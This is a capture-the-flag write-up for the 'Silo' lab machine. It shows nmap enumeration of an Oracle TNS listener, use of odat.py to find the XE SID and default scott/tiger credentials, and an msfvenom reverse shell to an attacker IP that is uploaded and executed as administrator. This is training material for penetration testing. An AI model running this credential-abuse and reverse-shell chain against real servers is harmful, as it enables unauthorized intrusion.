# Silo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.188 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 08:12 EDT
Warning: 10.129.95.188 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.188
Host is up (0.013s latency).
Not shown: 65350 closed tcp ports (conn-refused), 170 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown
```

Lots of ports, including some I'm not familiar with like port 1521.

### Oracle RCE

I initially ran a few directory scans and SMB enumeration, but they all returned nothing interesting. So I decided to scan port 1521 in detail because I normally don't see that one.

```
$ sudo nmap -p 1521 -sC -sV -O -T4 10.129.95.188 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 08:15 EDT
Nmap scan report for 10.129.95.188
Host is up (0.0073s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

So this was an Oracle port. Based on Hacktricks, we can try using `odat.py` to attack this.

{% embed url="https://github.com/quentinhardy/odat" %}

We can run the enumeration to find all SIDs and possible passwords before attacking it.&#x20;

```
$ ./odat.py all -s 10.129.95.188 -p 1521 
<TRUNCATED OUTPUT>
[+] SIDs found on the 10.129.95.188:1521 server: XE
[+] Service Name(s) found on the 10.129.95.188:1521 server: XE,XEXDB
[+] Valid credentials found: scott/tiger. Continue...                  
```

We found the database and also some credentials, which I think is enough to exploit this system easily. With these, we can upload a reverse shell onto the server rather easily.&#x20;

First, we can create a reverse shell via `msfvenom`:

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f exe -o rev.exe
```

Then we can run the following commands:

{% code overflow="wrap" %}
```
$ ./odat.py utlfile -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --putFile \\temp rev.exe rev.exe

[1] (10.129.95.188:1521): Put the rev.exe local file in the \temp folder like rev.exe on the 10.129.95.188 server
[+] The rev.exe file was created on the \temp directory on the 10.129.95.188 server like the rev.exe file

$ ./odat.py externaltable -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sysdba --exec \\temp rev.exe         

[1] (10.129.95.188:1521): Execute the rev.exe command stored in the \temp path
```
{% endcode %}

We would gain a reverse shell as the administrator.&#x20;

<figure><img src="../../../.gitbook/assets/image (3685).png" alt=""><figcaption></figcaption></figure>
